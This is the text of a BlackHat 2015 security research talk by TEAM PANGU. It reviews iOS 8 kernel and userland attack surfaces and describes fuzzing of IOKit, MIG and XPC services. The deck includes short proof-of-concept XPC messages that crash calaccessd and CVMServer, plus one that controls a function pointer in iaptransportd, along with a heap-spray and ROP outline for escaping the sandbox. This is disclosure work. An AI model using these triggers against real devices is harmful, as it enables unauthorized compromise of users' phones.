Review and Exploit Neglected Attack Surface in iOS 8
Tielei Wang, Hao Xu, Xiaobo Chen of TEAM PANGU
BlackHat 2015

Agenda
 iOS Security Background  Review of Attack Surfaces  Fuzz More IOKit and MIG System  Exploit Userland XPC Services  Conclusion

iOS Security Background
 Sandbox  Code Sign  Exploit Mitigation  Data Protection  Even hypervisor ... ?

Agenda
 iOS Security Background  Review of Attack Surfaces  Fuzz More IOKit and MIG System  Exploit Userland XPC Services  Conclusion

Userland Local Attack Surface
 USB cable
 File access interface  Backup/Restore interface  APP management interface  Developer interface
 Installed app
 Jekyll App (USENIX Security 2013)  Masque Attacks (FireEye Research)

Userland Remote Attack Surface
 Any network connection could be an attack surface
 Mobile Safari
 JailbreakMe  Mobile Pwn2Own
 Messager
 CVE-2009-2204, SMS vulnerability, Charlie Miller  CVE-2015-1157, crafted Unicode text reboot bug  System network daemons  CVE-2015-1118, crafted configuration profile reboot bug

Kernel Attack Surface

 Any communication channel between the user space and the kernel is an attack surface

UserSpace

BSD System Calls Mach Trap

Kernel

Kernel Attack Surface

 Take a further look

UserSpace

ioctl File System Devices IOKit MIG ...

Kernel

Kernel Attack Surface
 File System
 HFS legacy volume name stack buffer overflow
 JailbreakMe 3 for iOS 4.2.x
 HFS heap overflow
 Corona for iOS 5.0

Kernel Attack Surface
 POSIX System Calls
 posix_spawn improperly checks file action data  p0sixspwn for iOS 6.1.3

Kernel Attack Surface
 ioctl
 Packet Filter Kernel Exploit
 DIOCADDRULE ioctl handler improper initialization  Decrement value of any kernel address
 limera1n/greenpois0n for iOS 4.1

Kernel Attack Surface
 /dev/*
 ptmx_get_ioctl out-of-bounds memory access
 No bounds check of minor number of ptmx device  evasi0n7 for iOS 7.0.x

Kernel Attack Surface
 IOKit - too many 0.0
 IOSurface  IOMobileFrameBuffer  IOUSBDeviceFamily  IOSharedDataQueue  IOHIDFamily ...

This Talk
 Kernel Space
 Improve IOKit Fuzzing  More IOKit  MIG System
 User Space
 XPC fuzzing

Agenda
 iOS Security Background  Review of Attack Surfaces  Fuzz More IOKit and MIG System  Exploit Userland XPC Services  Conclusion

iOS Kernel Fuzzing
 IOKit is the best target for kernel fuzzing  Most IOKit fuzzers focus on IOConnectCallMethod
 IOUserClient::externalMethod  IOUserClient::getTargetAndMethodForIndex

Improve IOKit Fuzzing
 IOConnectCallMethod -> io_connect_method
 io_connect_method calls mach_msg to trap into the kernel  IOConnectCallMethod is just a wrapper
 BUT affects how the kernel deals with the input/output structures  Size > 4096 - Uses IOMemoryDescriptor to map the memory  Size <= 4096 - Directly calls copyin/copyout to access the memory

Improve IOKit Fuzzing

Improve IOKit Fuzzing
 Directly call io_connect_method rather than IOConnectCallMethod
 Be able to bypass the size restriction  May fuzz more parts of IOKit
 Example - CVE-2014-4487
 The vulnerable code is for overly large output structures  But it can be triggered by very small output structures by calling
io_connect_method directly

Improve IOKit Fuzzing
 DO NOT forget info leak bugs
 Check possible kernel space addresses in all outputs during fuzzing

More IOKit Fuzzing
 Shared Memory  Traps

Shared Memory of IOKit
 IOKit can share data directly with user space apps
 Assume user space apps know the structure of data
 User space apps just need to call IOConnectMapMemory after successfully calling IOServiceOpen
 memoryType may be meaningful for IOKit extensions

Shared Memory of IOKit
 How the kernel handles it
 Override IOUserClient::clientMemoryForType function  Return an IOMemoryDescriptor object
Example code

Shared Memory of IOKit
 Improve fuzzing
 Try to open shared memory of IOKit  Randomly fill the shared memory while fuzzing io_connect_method
 Example
 CVE-2014-4418 - IODataQueue  CVE-2014-4388 - IODataQueue  CVE-2014-4461 - IOSharedDataQueue
 The kernel should not trust shared memory data that could be modified by user space apps

IOKit Traps
 User space function
 IOConnectTrap[0-6] -> iokit_user_client_trap  Input
 index - function selector  p1~p6 - six input parameters

IOKit Traps
 How the kernel handles it
 Get the IOExternalTrap structure from index  Directly call the function pointer in IOExternalTrap - no more checks

IOKit Traps
 IOKit extensions may override two functions
 getTargetAndTrapForIndex <- most likely to override this  getExternalTrapForIndex

IOKit Traps

 Fuzzing

 Locate overridden functions -> determine the range of index

 Tips

 The IOExternalTrap definition is different from XNU source

struct IOExternalTrap {

IOService * object;

IOTrap func; // if flag=0, func is real function pointer

int

flag; // if flag=1, real function=*(IOTrap*)(vtable+func)

};

MIG System
 Lots of API finally call mach_msg to trap into kernel
 mach_vm_* / mach_port_* / io_connect_* / ...  IDA of io_service_close
 mach_msg_header_t.msgh_id

MIG System
 How the kernel handles it
 ipc_kobject_server finds mig_hash_t structure in mig_buckets according to msgh_id
 Call mig_hash_t.routine

MIG System
 Locate mig_buckets to know all valid msgh_id
 mig_init function initializes mig_buckets
 mig_e stores all subsystem definitions

MIG System
 mig_e in XNU source

MIG System
 mig_e in IDA
 Get all useful information

MIG System
 Idea of fuzzing MIG system
 Roughly fuzzing all functions  Accurately fuzzing each function
 Need to analyze the structure inside the message

IOKit Traps 0day
 IOStreamUserClient::getTargetAndTrapForIndex
 Restrict index <= 2 but only two IOExternalTrap elements in array!  This code is just ... UNBELIEVABLE 0.0
 Still unfixed in iOS 8.4.1

Agenda
 iOS Security Background  Review of Attack Surfaces  Fuzz More IOKit and MIG System  Exploit Userland XPC Services  Conclusion

IPC on iOS/OS X

 iOS and Mac OS X provide a large number of IPC mechanisms

Process
Sandbox

Apple Events Shared Memory Pipes Distributed Objects
Sockets Mach Message X...PC

Services

 Two of most commonly used ways: Mach Message and XPC

Previous Work on Mach Message
 Mach messages are the fundamental of IPCs
 Through mach trap mach_msg_overwrite_trap
 Mining Mach Services within OS X Sandbox. Meder Kydryraliev, 2013
 Hacking at Mach2. Dai Zovi, 2011  Hacking at Mach Speed. Dai Zovi, 2011

XPC
 Introduced in OS X 10.7 Lion and iOS 5 in 2011  Built on Mach messages, and simplified the low level
details of IPC
 Simple interface to look up services by name  Simple to send and receive asynchronous messages  Strongly-typed messages

XPC Services on iOS (Server)
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example", NULL,
XPC_CONNECTION_MACH_SERVICE_LISTENER); xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
// Connection dispatch xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
// Message dispatch xpc_type_t type = xpc_get_type(event); if (type == XPC_TYPE_DICTIONARY){
//Message handler } }); xpc_connection_resume(peer); }); xpc_connection_resume(listener);

XPC Services on iOS (Server)
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example", NULL,
XPC_CONNECTION_MACH_SERVICE_LISTENER); xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
// Connection dispatch xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
// Message dispatch xpc_type_t type = xpc_get_type(event); if (type == XPC_TYPE_DICTIONARY){
//Message handler } }); xpc_connection_resume(peer); }); xpc_connection_resume(listener);
Use xpc_connection_create_mach_service() to setup a named system service on iOS

XPC Services on iOS (Server)
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example", NULL,
XPC_CONNECTION_MACH_SERVICE_LISTENER); xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
// Connection dispatch xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
// Message dispatch xpc_type_t type = xpc_get_type(event); if (type == XPC_TYPE_DICTIONARY){
//Message handler } }); xpc_connection_resume(peer); }); xpc_connection_resume(listener);
The name of the service (reserved in MachServices of system plist files)

XPC Services on iOS (Server)
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example", NULL,
XPC_CONNECTION_MACH_SERVICE_LISTENER); xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
// Connection dispatch xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
// Message dispatch xpc_type_t type = xpc_get_type(event); if (type == XPC_TYPE_DICTIONARY){
//Message handler } }); xpc_connection_resume(peer); }); xpc_connection_resume(listener);
XPC_CONNECTION_MACH_SERVICE_LISTENER indicates a server

XPC Services on iOS (Server)
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example", NULL,
XPC_CONNECTION_MACH_SERVICE_LISTENER); xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
// Connection dispatch xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
// Message dispatch xpc_type_t type = xpc_get_type(event); if (type == XPC_TYPE_DICTIONARY){
//Message handler } }); xpc_connection_resume(peer); }); xpc_connection_resume(listener);
xpc_connection_set_event_handler is called to specify the connection handlers

XPC Services on iOS (Server)
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example", NULL,
XPC_CONNECTION_MACH_SERVICE_LISTENER); xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
// Connection dispatch xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
// Message dispatch xpc_type_t type = xpc_get_type(event); if (type == XPC_TYPE_DICTIONARY){
//Message handler } }); xpc_connection_resume(peer); }); xpc_connection_resume(listener);
xpc_connection_set_event_handler is called again to specify the message handlers

XPC Services on iOS (Server)
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example", NULL,
XPC_CONNECTION_MACH_SERVICE_LISTENER); xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
// Connection dispatch xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
// Message dispatch xpc_type_t type = xpc_get_type(event); if (type == XPC_TYPE_DICTIONARY){
//Message handler } }); xpc_connection_resume(peer); }); xpc_connection_resume(listener);
Parse the XPC dictionary and handle the data

XPC Services on iOS (Client)
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.xpc.example", NULL, 0);
xpc_connection_set_event_handler(client, ^(xpc_object_t event) { //connection err handler
}); xpc_connection_resume(client); xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_double(message, "value1", 1.0); xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);

XPC Services on iOS (Client)
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.xpc.example", NULL, 0);
xpc_connection_set_event_handler(client, ^(xpc_object_t event) { //connection err handler
}); xpc_connection_resume(client); xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_double(message, "value1", 1.0); xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);
0 indicates a client

XPC Services on iOS (Client)
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.xpc.example", NULL, 0);
xpc_connection_set_event_handler(client, ^(xpc_object_t event) { //connection err handler
}); xpc_connection_resume(client); xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_double(message, "value1", 1.0); xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);
Create an XPC dictionary

XPC Services on iOS (Client)
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.xpc.example", NULL, 0);
xpc_connection_set_event_handler(client, ^(xpc_object_t event) { //connection err handler
}); xpc_connection_resume(client); xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_double(message, "value1", 1.0); xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);
Insert a double value in message

XPC Services on iOS (Client)
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.xpc.example", NULL, 0);
xpc_connection_set_event_handler(client, ^(xpc_object_t event) { //connection err handler
}); xpc_connection_resume(client); xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_double(message, "value1", 1.0); xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);
Send the message to the server and get a reply

XPC Dataflow

Serialization

Deserialization

Object Dereference

Data Dereference

xpc dict

Mach message

xpc dict

xpc objects

Raw Data

Sender

Receiver

XPC Dataflow

Serialization

Deserialization

Object Dereference

Data Dereference

xpc dict

Mach message

xpc dict

xpc objects

Raw Data

Sender

Receiver

Type Confusion Vulnerabilities

Serialization

Deserialization

Object Dereference

Data Dereference

xpc dict

Mach message

xpc dict

xpc objects

Raw Data

Sender

Receiver

 Auditing and Exploiting Apple IPC. Ian Beer, 2015

Type Confusion Vulnerabilities
//get an object in untrusted message xpc_object_t value = xpc_dictionary_get_value(untrustedMessage, "key"); //presume it is an xpc_type_data and do not perform type validations. void* ptr = xpc_data_get_bytes_ptr(value);
Please refer to Ian Beer's work for exploit details

Apple's Fix
//get an object in untrusted message xpc_object_t value = xpc_dictionary_get_value(untrustedMessage, "key"); //presume it is an xpc_type_data and do not perform type validations. void* ptr = xpc_data_get_bytes_ptr(value);
Perform type checks in all xpc_*_get_* APIs, which eliminates MANY type confusions

Our work: Focus on Data Dereference

Serialization

Deserialization

Object Dereference

Data Dereference

xpc dict

Mach message

xpc dict

xpc objects

Raw Data

Sender

Receiver

Passive Fuzzing
 Select a target service, hook xpc_connection_set_event_handler() function to get the message handlers
 Hook the message handlers and mutate all received messages

Proactive Fuzzing
 Find all connectable services by decompiling the container sandbox profile
 Grep xpc_connection_create_mach_se rvice to identify all xpc listeners
 XPC_CONNECTION_MACH_ SERVICE_LISTENER

Retrieve Message Keys
 Use IDAPython script to find all xref of xpc_dictionary_get_* and analyze the strings in R1

Fuzzing Results
 Run a fuzzer on iOS 8.2
 Latest version at that moment
 Crash analysis
 Null pointer  Out-of-bounds memory access  "remote" code execution
 Some crashes might be fixed in iOS 8.4.

Null Pointer Dereference (calaccessd)
 Services presume the existence of certain keys in the messages

POC

/System/Library/Frameworks/EventKit.framework/Support/calaccessd

xpc_connection_t client = xpc_connection_create_mach_service("com.apple.calaccessd.xpc", NULL, 0); xpc_connection_set_event_handler(client, ^void(xpc_object_t response) { });

xpc_connection_resume(client);

xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_int64(dict, "message", 1);
//any message with the "function" key can trigger the crash

xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, dict);

Out-of-Bounds Read (CVMServer)
/System/Library/Frameworks/OpenGLES.framework/CVMServer

POC

//construct and send the handshake message
xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_int64(dict, "message", 1); xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, dict); xpc_dictionary_set_int64(dict, "message", 4); xpc_dictionary_set_string(dict, "framework_name", "OpenCLCPU"); xpc_dictionary_set_string(dict, "bitcode_name", ""); xpc_dictionary_set_string(dict, "plugin_name", ""); reply = xpc_connection_send_message_with_reply_sync(client, dict);

More Memory Errors in libsystem_configuration.dylib

dns_config_t * dns_configuration_copy(){ ... reply = libSC_send_message_with_reply_sync(dnsinfo_client, reqdict);

reply is passed from the "server"

if (reply != NULL) { ... dataRef = xpc_dictionary_get_data(reply, DNSINFO_CONFIGURATION, &dataLen);

...

if (n_padding <= (DNS_CONFIG_BUF_MAX - dataLen)) {

size_t

len;

len = dataLen + n_padding; buf = malloc(len); bcopy((void *)dataRef, buf, dataLen); bzero(&buf[dataLen], n_padding); } }

if (buf != NULL) { /* ALIGN: cast okay since _dns_config_buf_t is int aligned */ config = expand_config((_dns_config_buf_t *)(void *)buf);
}

static dns_config_t * expand_config(_dns_config_buf_t *buf) {
... padding = &buf->attribute[ntohl(buf->n_attribute)]; n_padding = ntohl(buf->n_padding);

More Memory Errors in libsystem_configuration.dylib

dns_config_t * dns_configuration_copy(){ ... reply = libSC_send_message_with_reply_sync(dnsinfo_client, reqdict);

if (reply != NULL) { ... dataRef = xpc_dictionary_get_data(reply, DNSINFO_CONFIGURATION, &dataLen);

...

if (n_padding <= (DNS_CONFIG_BUF_MAX - dataLen)) {

size_t

len;

len = dataLen + n_padding; buf = malloc(len); bcopy((void *)dataRef, buf, dataLen); bzero(&buf[dataLen], n_padding); } }

dataRef is retrieved from reply

if (buf != NULL) { /* ALIGN: cast okay since _dns_config_buf_t is int aligned */ config = expand_config((_dns_config_buf_t *)(void *)buf);
}

static dns_config_t * expand_config(_dns_config_buf_t *buf) {
... padding = &buf->attribute[ntohl(buf->n_attribute)]; n_padding = ntohl(buf->n_padding);

More Memory Errors in libsystem_configuration.dylib

dns_config_t * dns_configuration_copy(){ ... reply = libSC_send_message_with_reply_sync(dnsinfo_client, reqdict);

if (reply != NULL) { ... dataRef = xpc_dictionary_get_data(reply, DNSINFO_CONFIGURATION, &dataLen);

...

if (n_padding <= (DNS_CONFIG_BUF_MAX - dataLen)) {

size_t

len;

len = dataLen + n_padding; buf = malloc(len); bcopy((void *)dataRef, buf, dataLen); bzero(&buf[dataLen], n_padding); } }

dataRef propagates to buf

if (buf != NULL) { /* ALIGN: cast okay since _dns_config_buf_t is int aligned */ config = expand_config((_dns_config_buf_t *)(void *)buf);
}

buf is passed to expand_config

static dns_config_t * expand_config(_dns_config_buf_t *buf) {
... padding = &buf->attribute[ntohl(buf->n_attribute)]; n_padding = ntohl(buf->n_padding);

More Memory Errors in libsystem_configuration.dylib

dns_config_t * dns_configuration_copy(){ ... reply = libSC_send_message_with_reply_sync(dnsinfo_client, reqdict);

if (reply != NULL) { ... dataRef = xpc_dictionary_get_data(reply, DNSINFO_CONFIGURATION, &dataLen);

...

if (n_padding <= (DNS_CONFIG_BUF_MAX - dataLen)) {

size_t

len;

len = dataLen + n_padding; buf = malloc(len); bcopy((void *)dataRef, buf, dataLen); bzero(&buf[dataLen], n_padding); } }

if (buf != NULL) { /* ALIGN: cast okay since _dns_config_buf_t is int aligned */ config = expand_config((_dns_config_buf_t *)(void *)buf);
}

static dns_config_t *

buf->n_attribute is used as an array index

expand_config(_dns_config_buf_t *buf)

{

...

padding = &buf->attribute[ntohl(buf->n_attribute)];

n_padding = ntohl(buf->n_padding);

A Surprise in com.apple.iaptransportd.xpc
v29 is retrieved from an XPC message
/System/Library/PrivateFrameworks/IAP.framework/Support/iaptransportd
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.iaptransportd.xpc", NULL, 0); xpc_connection_set_event_handler(client, ^void(xpc_object_t response) { }); xpc_connection_resume(client); xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_string(dict, "requestType", "setPortLockout");
//requestType must be setPortLockout
xpc_dictionary_set_uint64(dict, "portID", 0xAAAAAAAA);
//*(*portID+32) will be the function pointer
xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, dict);

A Surprise in com.apple.iaptransportd.xpc
*(*v29+32) is used as a function pointer
/System/Library/PrivateFrameworks/IAP.framework/Support/iaptransportd
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.iaptransportd.xpc", NULL, 0); xpc_connection_set_event_handler(client, ^void(xpc_object_t response) { }); xpc_connection_resume(client); xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_string(dict, "requestType", "setPortLockout");
//requestType must be setPortLockout
xpc_dictionary_set_uint64(dict, "portID", 0xAAAAAAAA);
//*(*portID+32) will be the function pointer
xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, dict);

How to Exploit it
 How to control *(*portID +32)
 Heap Spraying
 Where to find ROP gadgets?
 dyld_shared_cache is shared among all processes, and has the same layout.
 Effects
 Exploitable by any container app  Bypass the container sandbox to access the system

Agenda
 iOS Security Background  Review of Attack Surfaces  Fuzz More IOKit and MIG System  Exploit Userland XPC Services  Conclusion

Conclusion
 The combination of previous techniques and new improvements may lead to new findings
 Apple puts more efforts on improving the whole security mechanisms rather than fixing individual bugs
 Reviewing all old code is necessary to Apple

Thanks for your attention Q&A

